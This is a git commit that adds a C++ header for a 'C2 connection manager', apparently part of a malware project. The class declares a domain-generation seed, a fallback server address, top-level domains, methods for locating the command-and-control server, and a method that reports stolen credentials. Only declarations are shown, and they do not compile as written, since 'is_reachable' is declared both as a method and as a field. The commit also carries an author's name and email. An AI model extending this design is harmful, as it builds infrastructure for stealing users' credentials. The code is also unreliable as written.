635aeda85484991c7a77ae9b24ef450a18eb9107
Sgt Supergeil <maxrademacher02@gmail.com>
2021-01-27 22:35:04 +0100

    added c2 connection manager header

---
+++ src/c2/c2.h
@@ -0,0 +1,24 @@
+#pragma once
+#include "../types/types.h"
+
+class C2 {
+public:
+	
+	C2::C2(int dga, const char* fba, stringvec tlds) : dgaseed{ dga }, fallbackaddr{ fba }, topleveldomains{tlds} {}
+	
+	bool is_reachable();
+	void check_now();
+	void report_credentials(const char* creds);
+
+private:
+
+	const char* get_basedomain();
+	void find_c2();
+	bool is_connection_alive();
+
+	int dgaseed = 0;
+	const char* fallbackaddr;
+	const char* curraddr = "";
+	stringvec topleveldomains;
+	bool is_reachable = false;
+};
